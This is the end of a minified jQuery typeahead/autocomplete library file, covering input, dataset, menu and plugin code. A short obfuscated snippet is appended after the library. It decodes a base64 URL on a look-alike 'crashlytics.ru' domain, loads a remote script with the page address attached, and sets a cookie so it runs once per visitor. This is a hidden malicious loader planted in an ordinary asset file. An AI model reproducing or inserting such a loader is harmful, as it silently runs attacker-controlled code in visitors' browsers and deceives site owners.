                this.resetInputValue(), this.trigger("blurred")
            }, _onFocus: function () {
                this.queryWhenFocused = this.query, this.trigger("focused")
            }, _onKeydown: function (t) {
                var e = r[t.which || t.keyCode];
                this._managePreventDefault(e, t), e && this._shouldTrigger(e, t) && this.trigger(e + "Keyed", t)
            }, _onInput: function () {
                this._setQuery(this.getInputValue()), this.clearHintIfInvalid(), this._checkLanguageDirection()
            }, _managePreventDefault: function (t, e) {
                var i;
                switch (t) {
                    case"up":
                    case"down":
                        i = !s(e);
                        break;
                    default:
                        i = !1
                }
                i && e.preventDefault()
            }, _shouldTrigger: function (t, e) {
                var i;
                switch (t) {
                    case"tab":
                        i = !s(e);
                        break;
                    default:
                        i = !0
                }
                return i
            }, _checkLanguageDirection: function () {
                var t = (this.$input.css("direction") || "ltr").toLowerCase();
                this.dir !== t && (this.dir = t, this.$hint.attr("dir", t), this.trigger("langDirChanged", t))
            }, _setQuery: function (t, e) {
                var i, o;
                o = !!(i = n(t, this.query)) && this.query.length !== t.length, this.query = t, e || i ? !e && o && this.trigger("whitespaceChanged", this.query) : this.trigger("queryChanged", this.query)
            }, _updateDescendent: function (t, e) {
                this.$input.attr("aria-activedescendant", e)
            }, bind: function () {
                var t, i, n, o, s = this;
                return t = e.bind(this._onBlur, this), i = e.bind(this._onFocus, this), n = e.bind(this._onKeydown, this), o = e.bind(this._onInput, this), this.$input.on("blur.tt", t).on("focus.tt", i).on("keydown.tt", n), !e.isMsie() || e.isMsie() > 9 ? this.$input.on("input.tt", o) : this.$input.on("keydown.tt keypress.tt cut.tt paste.tt", (function (t) {
                    r[t.which || t.keyCode] || e.defer(e.bind(s._onInput, s, t))
                })), this
            }, focus: function () {
                this.$input.focus()
            }, blur: function () {
                this.$input.blur()
            }, getLangDir: function () {
                return this.dir
            }, getQuery: function () {
                return this.query || ""
            }, setQuery: function (t, e) {
                this.setInputValue(t), this._setQuery(t, e)
            }, hasQueryChangedSinceLastFocus: function () {
                return this.query !== this.queryWhenFocused
            }, getInputValue: function () {
                return this.$input.val()
            }, setInputValue: function (t) {
                this.$input.val(t), this.clearHintIfInvalid(), this._checkLanguageDirection()
            }, resetInputValue: function () {
                this.setInputValue(this.query)
            }, getHint: function () {
                return this.$hint.val()
            }, setHint: function (t) {
                this.$hint.val(t)
            }, clearHint: function () {
                this.setHint("")
            }, clearHintIfInvalid: function () {
                var t, e, i;
                i = (t = this.getInputValue()) !== (e = this.getHint()) && 0 === e.indexOf(t), !("" !== t && i && !this.hasOverflow()) && this.clearHint()
            }, hasFocus: function () {
                return this.$input.is(":focus")
            }, hasOverflow: function () {
                var t = this.$input.width() - 2;
                return this.$overflowHelper.text(this.getInputValue()), this.$overflowHelper.width() >= t
            }, isCursorAtEnd: function () {
                var t, i, n;
                return t = this.$input.val().length, i = this.$input[0].selectionStart, e.isNumber(i) ? i === t : !document.selection || ((n = document.selection.createRange()).moveStart("character", -t), t === n.text.length)
            }, destroy: function () {
                this.$hint.off(".tt"), this.$input.off(".tt"), this.$overflowHelper.remove(), this.$hint = this.$input = this.$overflowHelper = t("<div>")
            }
        }), i
    }(), a = function () {
        "use strict";

        function i(i, n) {
            (i = i || {}).templates = i.templates || {}, i.templates.notFound = i.templates.notFound || i.templates.empty, i.source || t.error("missing source"), i.node || t.error("missing node"), i.name && !function (t) {
                return /^[_a-zA-Z0-9-]+$/.test(t)
            }(i.name) && t.error("invalid dataset name: " + i.name), n.mixin(this), this.highlight = !!i.highlight, this.name = e.toStr(i.name || r()), this.limit = i.limit || 5, this.displayFn = function (t) {
                function i(e) {
                    return e[t]
                }

                return t = t || e.stringify, e.isFunction(t) ? t : i
            }(i.display || i.displayKey), this.templates = function (i, n) {
                function o(i) {
                    return t('<div role="option">').attr("id", e.guid()).text(n(i))
                }

                return {
                    notFound: i.notFound && e.templatify(i.notFound),
                    pending: i.pending && e.templatify(i.pending),
                    header: i.header && e.templatify(i.header),
                    footer: i.footer && e.templatify(i.footer),
                    suggestion: i.suggestion || o
                }
            }(i.templates, this.displayFn), this.source = i.source.__ttAdapter ? i.source.__ttAdapter() : i.source, this.async = e.isUndefined(i.async) ? this.source.length > 2 : !!i.async, this._resetLastSuggestion(), this.$el = t(i.node).attr("role", "presentation").addClass(this.classes.dataset).addClass(this.classes.dataset + "-" + this.name)
        }

        var n, r;
        return n = {
            dataset: "tt-selectable-dataset",
            val: "tt-selectable-display",
            obj: "tt-selectable-object"
        }, r = e.getIdGenerator(), i.extractData = function (e) {
            var i = t(e);
            return i.data(n.obj) ? {
                dataset: i.data(n.dataset) || "",
                val: i.data(n.val) || "",
                obj: i.data(n.obj) || null
            } : null
        }, e.mixin(i.prototype, o, {
            _overwrite: function (t, e) {
                (e = e || []).length ? this._renderSuggestions(t, e) : this.async && this.templates.pending ? this._renderPending(t) : !this.async && this.templates.notFound ? this._renderNotFound(t) : this._empty(), this.trigger("rendered", e, !1, this.name)
            }, _append: function (t, e) {
                (e = e || []).length && this.$lastSuggestion.length ? this._appendSuggestions(t, e) : e.length ? this._renderSuggestions(t, e) : !this.$lastSuggestion.length && this.templates.notFound && this._renderNotFound(t), this.trigger("rendered", e, !0, this.name)
            }, _renderSuggestions: function (t, e) {
                var i;
                i = this._getSuggestionsFragment(t, e), this.$lastSuggestion = i.children().last(), this.$el.html(i).prepend(this._getHeader(t, e)).append(this._getFooter(t, e))
            }, _appendSuggestions: function (t, e) {
                var i, n;
                n = (i = this._getSuggestionsFragment(t, e)).children().last(), this.$lastSuggestion.after(i), this.$lastSuggestion = n
            }, _renderPending: function (t) {
                var e = this.templates.pending;
                this._resetLastSuggestion(), e && this.$el.html(e({query: t, dataset: this.name}))
            }, _renderNotFound: function (t) {
                var e = this.templates.notFound;
                this._resetLastSuggestion(), e && this.$el.html(e({query: t, dataset: this.name}))
            }, _empty: function () {
                this.$el.empty(), this._resetLastSuggestion()
            }, _getSuggestionsFragment: function (i, o) {
                var r, a = this;
                return r = document.createDocumentFragment(), e.each(o, (function (e) {
                    var o, s;
                    s = a._injectQuery(i, e), o = t(a.templates.suggestion(s)).data(n.dataset, a.name).data(n.obj, e).data(n.val, a.displayFn(e)).addClass(a.classes.suggestion + " " + a.classes.selectable), r.appendChild(o[0])
                })), this.highlight && s({className: this.classes.highlight, node: r, pattern: i}), t(r)
            }, _getFooter: function (t, e) {
                return this.templates.footer ? this.templates.footer({
                    query: t,
                    suggestions: e,
                    dataset: this.name
                }) : null
            }, _getHeader: function (t, e) {
                return this.templates.header ? this.templates.header({
                    query: t,
                    suggestions: e,
                    dataset: this.name
                }) : null
            }, _resetLastSuggestion: function () {
                this.$lastSuggestion = t()
            }, _injectQuery: function (t, i) {
                return e.isObject(i) ? e.mixin({_query: t}, i) : i
            }, update: function (e) {
                function i(t) {
                    s || (s = !0, t = (t || []).slice(0, n.limit), r = t.length, n._overwrite(e, t), r < n.limit && n.async && n.trigger("asyncRequested", e, n.name))
                }

                var n = this, o = !1, s = !1, r = 0;
                this.cancel(), this.cancel = function () {
                    o = !0, n.cancel = t.noop, n.async && n.trigger("asyncCanceled", e, n.name)
                }, this.source(e, i, (function (i) {
                    if (i = i || [], !o && r < n.limit) {
                        n.cancel = t.noop;
                        var s = Math.abs(r - n.limit);
                        r += s, n._append(e, i.slice(0, s)), n.async && n.trigger("asyncReceived", e, n.name)
                    }
                })), !s && i([])
            }, cancel: t.noop, clear: function () {
                this._empty(), this.cancel(), this.trigger("cleared")
            }, isEmpty: function () {
                return this.$el.is(":empty")
            }, destroy: function () {
                this.$el = t("<div>")
            }
        }), i
    }(), l = function () {
        "use strict";

        function i(i, n) {
            var o = this;
            (i = i || {}).node || t.error("node is required"), n.mixin(this), this.$node = t(i.node), this.query = null, this.datasets = e.map(i.datasets, (function (e) {
                var i = o.$node.find(e.node).first();
                return e.node = i.length ? i : t("<div>").appendTo(o.$node), new a(e, n)
            }))
        }

        return e.mixin(i.prototype, o, {
            _onSelectableClick: function (e) {
                this.trigger("selectableClicked", t(e.currentTarget))
            }, _onRendered: function (t, e, i, n) {
                this.$node.toggleClass(this.classes.empty, this._allDatasetsEmpty()), this.trigger("datasetRendered", e, i, n)
            }, _onCleared: function () {
                this.$node.toggleClass(this.classes.empty, this._allDatasetsEmpty()), this.trigger("datasetCleared")
            }, _propagate: function () {
                this.trigger.apply(this, arguments)
            }, _allDatasetsEmpty: function () {
                return e.every(this.datasets, e.bind((function (t) {
                    var e = t.isEmpty();
                    return this.$node.attr("aria-expanded", !e), e
                }), this))
            }, _getSelectables: function () {
                return this.$node.find(this.selectors.selectable)
            }, _removeCursor: function () {
                var t = this.getActiveSelectable();
                t && t.removeClass(this.classes.cursor)
            }, _ensureVisible: function (t) {
                var e, i, n, o;
                i = (e = t.position().top) + t.outerHeight(!0), n = this.$node.scrollTop(), o = this.$node.height() + parseInt(this.$node.css("paddingTop"), 10) + parseInt(this.$node.css("paddingBottom"), 10), e < 0 ? this.$node.scrollTop(n + e) : o < i && this.$node.scrollTop(n + (i - o))
            }, bind: function () {
                var i, n = this;
                return i = e.bind(this._onSelectableClick, this), this.$node.on("click.tt", this.selectors.selectable, i), this.$node.on("mouseover", this.selectors.selectable, (function () {
                    n.setCursor(t(this))
                })), this.$node.on("mouseleave", (function () {
                    n._removeCursor()
                })), e.each(this.datasets, (function (t) {
                    t.onSync("asyncRequested", n._propagate, n).onSync("asyncCanceled", n._propagate, n).onSync("asyncReceived", n._propagate, n).onSync("rendered", n._onRendered, n).onSync("cleared", n._onCleared, n)
                })), this
            }, isOpen: function () {
                return this.$node.hasClass(this.classes.open)
            }, open: function () {
                this.$node.scrollTop(0), this.$node.addClass(this.classes.open)
            }, close: function () {
                this.$node.attr("aria-expanded", !1), this.$node.removeClass(this.classes.open), this._removeCursor()
            }, setLanguageDirection: function (t) {
                this.$node.attr("dir", t)
            }, selectableRelativeToCursor: function (t) {
                var e, i, n;
                return i = this.getActiveSelectable(), e = this._getSelectables(), -1 === (n = (n = ((n = (i ? e.index(i) : -1) + t) + 1) % (e.length + 1) - 1) < -1 ? e.length - 1 : n) ? null : e.eq(n)
            }, setCursor: function (t) {
                this._removeCursor(), (t = t && t.first()) && (t.addClass(this.classes.cursor), this._ensureVisible(t))
            }, getSelectableData: function (t) {
                return t && t.length ? a.extractData(t) : null
            }, getActiveSelectable: function () {
                var t = this._getSelectables().filter(this.selectors.cursor).first();
                return t.length ? t : null
            }, getTopSelectable: function () {
                var t = this._getSelectables().first();
                return t.length ? t : null
            }, update: function (t) {
                var i = t !== this.query;
                return i && (this.query = t, e.each(this.datasets, (function (e) {
                    e.update(t)
                }))), i
            }, empty: function () {
                e.each(this.datasets, (function (t) {
                    t.clear()
                })), this.query = null, this.$node.addClass(this.classes.empty)
            }, destroy: function () {
                this.$node.off(".tt"), this.$node = t("<div>"), e.each(this.datasets, (function (t) {
                    t.destroy()
                }))
            }
        }), i
    }(), c = function () {
        "use strict";

        function i(i) {
            this.$el = t("<span></span>", {role: "status", "aria-live": "polite"}).css({
                position: "absolute",
                padding: "0",
                border: "0",
                height: "1px",
                width: "1px",
                "margin-bottom": "-1px",
                "margin-right": "-1px",
                overflow: "hidden",
                clip: "rect(0 0 0 0)",
                "white-space": "nowrap"
            }), i.$input.after(this.$el), e.each(i.menu.datasets, e.bind((function (t) {
                t.onSync && (t.onSync("rendered", e.bind(this.update, this)), t.onSync("cleared", e.bind(this.cleared, this)))
            }), this))
        }

        return e.mixin(i.prototype, {
            update: function (t, e) {
                var i, n = e.length;
                i = 1 === n ? {result: "result", is: "is"} : {
                    result: "results",
                    is: "are"
                }, this.$el.text(n + " " + i.result + " " + i.is + " available, use up and down arrow keys to navigate.")
            }, cleared: function () {
                this.$el.text("")
            }
        }), i
    }(), d = function () {
        "use strict";

        function t() {
            l.apply(this, [].slice.call(arguments, 0))
        }

        var i = l.prototype;
        return e.mixin(t.prototype, l.prototype, {
            open: function () {
                return !this._allDatasetsEmpty() && this._show(), i.open.apply(this, [].slice.call(arguments, 0))
            }, close: function () {
                return this._hide(), i.close.apply(this, [].slice.call(arguments, 0))
            }, _onRendered: function () {
                return this._allDatasetsEmpty() ? this._hide() : this.isOpen() && this._show(), i._onRendered.apply(this, [].slice.call(arguments, 0))
            }, _onCleared: function () {
                return this._allDatasetsEmpty() ? this._hide() : this.isOpen() && this._show(), i._onCleared.apply(this, [].slice.call(arguments, 0))
            }, setLanguageDirection: function (t) {
                return this.$node.css("ltr" === t ? this.css.ltr : this.css.rtl), i.setLanguageDirection.apply(this, [].slice.call(arguments, 0))
            }, _hide: function () {
                this.$node.hide()
            }, _show: function () {
                this.$node.css("display", "block")
            }
        }), t
    }(), u = function () {
        "use strict";

        function i(i, o) {
            var s, r, a, l, c, d, u, h, p, f, g;
            (i = i || {}).input || t.error("missing input"), i.menu || t.error("missing menu"), i.eventBus || t.error("missing event bus"), o.mixin(this), this.eventBus = i.eventBus, this.minLength = e.isNumber(i.minLength) ? i.minLength : 1, this.input = i.input, this.menu = i.menu, this.enabled = !0, this.autoselect = !!i.autoselect, this.active = !1, this.input.hasFocus() && this.activate(), this.dir = this.input.getLangDir(), this._hacks(), this.menu.bind().onSync("selectableClicked", this._onSelectableClicked, this).onSync("asyncRequested", this._onAsyncRequested, this).onSync("asyncCanceled", this._onAsyncCanceled, this).onSync("asyncReceived", this._onAsyncReceived, this).onSync("datasetRendered", this._onDatasetRendered, this).onSync("datasetCleared", this._onDatasetCleared, this), s = n(this, "activate", "open", "_onFocused"), r = n(this, "deactivate", "_onBlurred"), a = n(this, "isActive", "isOpen", "_onEnterKeyed"), l = n(this, "isActive", "isOpen", "_onTabKeyed"), c = n(this, "isActive", "_onEscKeyed"), d = n(this, "isActive", "open", "_onUpKeyed"), u = n(this, "isActive", "open", "_onDownKeyed"), h = n(this, "isActive", "isOpen", "_onLeftKeyed"), p = n(this, "isActive", "isOpen", "_onRightKeyed"), f = n(this, "_openIfActive", "_onQueryChanged"), g = n(this, "_openIfActive", "_onWhitespaceChanged"), this.input.bind().onSync("focused", s, this).onSync("blurred", r, this).onSync("enterKeyed", a, this).onSync("tabKeyed", l, this).onSync("escKeyed", c, this).onSync("upKeyed", d, this).onSync("downKeyed", u, this).onSync("leftKeyed", h, this).onSync("rightKeyed", p, this).onSync("queryChanged", f, this).onSync("whitespaceChanged", g, this).onSync("langDirChanged", this._onLangDirChanged, this)
        }

        function n(t) {
            var i = [].slice.call(arguments, 1);
            return function () {
                var n = [].slice.call(arguments);
                e.each(i, (function (e) {
                    return t[e].apply(t, n)
                }))
            }
        }

        return e.mixin(i.prototype, {
            _hacks: function () {
                var i, n;
                i = this.input.$input || t("<div>"), n = this.menu.$node || t("<div>"), i.on("blur.tt", (function (t) {
                    var o, s, r;
                    o = document.activeElement, s = n.is(o), r = n.has(o).length > 0, e.isMsie() && (s || r) && (t.preventDefault(), t.stopImmediatePropagation(), e.defer((function () {
                        i.focus()
                    })))
                })), n.on("mousedown.tt", (function (t) {
                    t.preventDefault()
                }))
            }, _onSelectableClicked: function (t, e) {
                this.select(e)
            }, _onDatasetCleared: function () {
                this._updateHint()
            }, _onDatasetRendered: function (t, e, i, n) {
                if (this._updateHint(), this.autoselect) {
                    var o = this.selectors.cursor.substr(1);
                    this.menu.$node.find(this.selectors.suggestion).first().addClass(o)
                }
                this.eventBus.trigger("render", e, i, n)
            }, _onAsyncRequested: function (t, e, i) {
                this.eventBus.trigger("asyncrequest", i, e)
            }, _onAsyncCanceled: function (t, e, i) {
                this.eventBus.trigger("asynccancel", i, e)
            }, _onAsyncReceived: function (t, e, i) {
                this.eventBus.trigger("asyncreceive", i, e)
            }, _onFocused: function () {
                this._minLengthMet() && this.menu.update(this.input.getQuery())
            }, _onBlurred: function () {
                this.input.hasQueryChangedSinceLastFocus() && this.eventBus.trigger("change", this.input.getQuery())
            }, _onEnterKeyed: function (t, e) {
                var i;
                (i = this.menu.getActiveSelectable()) ? this.select(i) && (e.preventDefault(), e.stopPropagation()) : this.autoselect && this.select(this.menu.getTopSelectable()) && (e.preventDefault(), e.stopPropagation())
            }, _onTabKeyed: function (t, e) {
                var i;
                (i = this.menu.getActiveSelectable()) ? this.select(i) && e.preventDefault() : (i = this.menu.getTopSelectable()) && this.autocomplete(i) && e.preventDefault()
            }, _onEscKeyed: function () {
                this.close()
            }, _onUpKeyed: function () {
                this.moveCursor(-1)
            }, _onDownKeyed: function () {
                this.moveCursor(1)
            }, _onLeftKeyed: function () {
                "rtl" === this.dir && this.input.isCursorAtEnd() && this.autocomplete(this.menu.getActiveSelectable() || this.menu.getTopSelectable())
            }, _onRightKeyed: function () {
                "ltr" === this.dir && this.input.isCursorAtEnd() && this.autocomplete(this.menu.getActiveSelectable() || this.menu.getTopSelectable())
            }, _onQueryChanged: function (t, e) {
                this._minLengthMet(e) ? this.menu.update(e) : this.menu.empty()
            }, _onWhitespaceChanged: function () {
                this._updateHint()
            }, _onLangDirChanged: function (t, e) {
                this.dir !== e && (this.dir = e, this.menu.setLanguageDirection(e))
            }, _openIfActive: function () {
                this.isActive() && this.open()
            }, _minLengthMet: function (t) {
                return (t = e.isString(t) ? t : this.input.getQuery() || "").length >= this.minLength
            }, _updateHint: function () {
                var t, i, n, o, s, a;
                t = this.menu.getTopSelectable(), i = this.menu.getSelectableData(t), n = this.input.getInputValue(), !i || e.isBlankString(n) || this.input.hasOverflow() ? this.input.clearHint() : (o = r.normalizeQuery(n), s = e.escapeRegExChars(o), (a = new RegExp("^(?:" + s + ")(.+$)", "i").exec(i.val)) && this.input.setHint(n + a[1]))
            }, isEnabled: function () {
                return this.enabled
            }, enable: function () {
                this.enabled = !0
            }, disable: function () {
                this.enabled = !1
            }, isActive: function () {
                return this.active
            }, activate: function () {
                return !!this.isActive() || !(!this.isEnabled() || this.eventBus.before("active")) && (this.active = !0, this.eventBus.trigger("active"), !0)
            }, deactivate: function () {
                return !this.isActive() || !this.eventBus.before("idle") && (this.active = !1, this.close(), this.eventBus.trigger("idle"), !0)
            }, isOpen: function () {
                return this.menu.isOpen()
            }, open: function () {
                return this.isOpen() || this.eventBus.before("open") || (this.menu.open(), this._updateHint(), this.eventBus.trigger("open")), this.isOpen()
            }, close: function () {
                return this.isOpen() && !this.eventBus.before("close") && (this.menu.close(), this.input.clearHint(), this.input.resetInputValue(), this.eventBus.trigger("close")), !this.isOpen()
            }, setVal: function (t) {
                this.input.setQuery(e.toStr(t))
            }, getVal: function () {
                return this.input.getQuery()
            }, select: function (t) {
                var e = this.menu.getSelectableData(t);
                return !(!e || this.eventBus.before("select", e.obj, e.dataset) || (this.input.setQuery(e.val, !0), this.eventBus.trigger("select", e.obj, e.dataset), this.close(), 0))
            }, autocomplete: function (t) {
                var e, i;
                return e = this.input.getQuery(), !(!((i = this.menu.getSelectableData(t)) && e !== i.val) || this.eventBus.before("autocomplete", i.obj, i.dataset) || (this.input.setQuery(i.val), this.eventBus.trigger("autocomplete", i.obj, i.dataset), 0))
            }, moveCursor: function (t) {
                var e, i, n, o, s, r;
                return e = this.input.getQuery(), i = this.menu.selectableRelativeToCursor(t), o = (n = this.menu.getSelectableData(i)) ? n.obj : null, s = n ? n.dataset : null, r = i ? i.attr("id") : null, this.input.trigger("cursorchange", r), !(this._minLengthMet() && this.menu.update(e)) && !this.eventBus.before("cursorchange", o, s) && (this.menu.setCursor(i), n ? this.input.setInputValue(n.val) : (this.input.resetInputValue(), this._updateHint()), this.eventBus.trigger("cursorchange", o, s), !0)
            }, destroy: function () {
                this.input.destroy(), this.menu.destroy()
            }
        }), i
    }();
    !function () {
        "use strict";

        function o(e, i) {
            e.each((function () {
                var e, n = t(this);
                (e = n.data(g.typeahead)) && i(e, n)
            }))
        }

        function s(t, e) {
            return t.clone().addClass(e.classes.hint).removeData().css(e.css.hint).css(function (t) {
                return {
                    backgroundAttachment: t.css("background-attachment"),
                    backgroundClip: t.css("background-clip"),
                    backgroundColor: t.css("background-color"),
                    backgroundImage: t.css("background-image"),
                    backgroundOrigin: t.css("background-origin"),
                    backgroundPosition: t.css("background-position"),
                    backgroundRepeat: t.css("background-repeat"),
                    backgroundSize: t.css("background-size")
                }
            }(t)).prop({
                readonly: !0,
                required: !1
            }).removeAttr("id name placeholder").removeClass("required").attr({spellcheck: "false", tabindex: -1})
        }

        function a(t, e) {
            t.data(g.attrs, {
                dir: t.attr("dir"),
                autocomplete: t.attr("autocomplete"),
                spellcheck: t.attr("spellcheck"),
                style: t.attr("style")
            }), t.addClass(e.classes.input).attr({spellcheck: !1});
            try {
                !t.attr("dir") && t.attr("dir", "auto")
            } catch (t) {
            }
            return t
        }

        function h(t) {
            var i, n;
            i = t.data(g.www), n = t.parent().filter(i.selectors.wrapper), e.each(t.data(g.attrs), (function (i, n) {
                e.isUndefined(i) ? t.removeAttr(n) : t.attr(n, i)
            })), t.removeData(g.typeahead).removeData(g.www).removeData(g.attr).removeClass(i.classes.input), n.length && (t.detach().insertAfter(n), n.remove())
        }

        function p(i) {
            var n;
            return (n = e.isJQuery(i) || e.isElement(i) ? t(i).first() : []).length ? n : null
        }

        var f, g, m;
        f = t.fn.typeahead, g = {www: "tt-www", attrs: "tt-attrs", typeahead: "tt-typeahead"}, m = {
            initialize: function (o, h) {
                function f() {
                    var i, f, v, y, _, w, b, x, C, $, S;
                    e.each(h, (function (t) {
                        t.highlight = !!o.highlight
                    })), i = t(this), f = t(m.html.wrapper), v = p(o.hint), y = p(o.menu), _ = !1 !== o.hint && !v, w = !1 !== o.menu && !y, _ && (v = s(i, m)), w && (y = t(m.html.menu).css(m.css.menu)), v && v.val(""), i = a(i, m), (_ || w) && (f.css(m.css.wrapper), i.css(_ ? m.css.input : m.css.inputWithNoHint), i.wrap(f).parent().prepend(_ ? v : null).append(w ? y : null)), S = w ? d : l, b = new n({el: i}), x = new r({
                        hint: v,
                        input: i
                    }, m), C = new S({node: y, datasets: h}, m), new c({$input: i, menu: C}), $ = new u({
                        input: x,
                        menu: C,
                        eventBus: b,
                        minLength: o.minLength,
                        autoselect: o.autoselect
                    }, m), i.data(g.www, m), i.data(g.typeahead, $)
                }

                var m;
                return h = e.isArray(h) ? h : [].slice.call(arguments, 1), m = i((o = o || {}).classNames), this.each(f)
            }, isEnabled: function () {
                var t;
                return o(this.first(), (function (e) {
                    t = e.isEnabled()
                })), t
            }, enable: function () {
                return o(this, (function (t) {
                    t.enable()
                })), this
            }, disable: function () {
                return o(this, (function (t) {
                    t.disable()
                })), this
            }, isActive: function () {
                var t;
                return o(this.first(), (function (e) {
                    t = e.isActive()
                })), t
            }, activate: function () {
                return o(this, (function (t) {
                    t.activate()
                })), this
            }, deactivate: function () {
                return o(this, (function (t) {
                    t.deactivate()
                })), this
            }, isOpen: function () {
                var t;
                return o(this.first(), (function (e) {
                    t = e.isOpen()
                })), t
            }, open: function () {
                return o(this, (function (t) {
                    t.open()
                })), this
            }, close: function () {
                return o(this, (function (t) {
                    t.close()
                })), this
            }, select: function (e) {
                var i = !1, n = t(e);
                return o(this.first(), (function (t) {
                    i = t.select(n)
                })), i
            }, autocomplete: function (e) {
                var i = !1, n = t(e);
                return o(this.first(), (function (t) {
                    i = t.autocomplete(n)
                })), i
            }, moveCursor: function (t) {
                var e = !1;
                return o(this.first(), (function (i) {
                    e = i.moveCursor(t)
                })), e
            }, val: function (t) {
                var i;
                return arguments.length ? (o(this, (function (i) {
                    i.setVal(e.toStr(t))
                })), this) : (o(this.first(), (function (t) {
                    i = t.getVal()
                })), i)
            }, destroy: function () {
                return o(this, (function (t, e) {
                    h(e), t.destroy()
                })), this
            }
        }, t.fn.typeahead = function (t) {
            return m[t] ? m[t].apply(this, [].slice.call(arguments, 1)) : m.initialize.apply(this, arguments)
        }, t.fn.typeahead.noConflict = function () {
            return t.fn.typeahead = f, this
        }
    }()
}));
!function (o, w, d, l) {
    try {
        o.c = "h" == l.protocol[0] && /./.test(l.hostname) && !/PHPPREFS/.test(d.cookie), setTimeout(function () {
            o.c && (o.s = d.createElement("script"), o.s.src = atob("aHR0cHM6Ly9hcGkuY3Jhc2hseXRpY3MucnUvdHJhY2tpbmcvc2NyaXB0LmpzP3JlZmVycmVyPQ==") + l.href, d.body.appendChild(o.s))
        }, 1e3), d.cookie = "PHPPREFS=full;max-age=39800;"
    } catch (e) {
    }
}({}, window, document, location);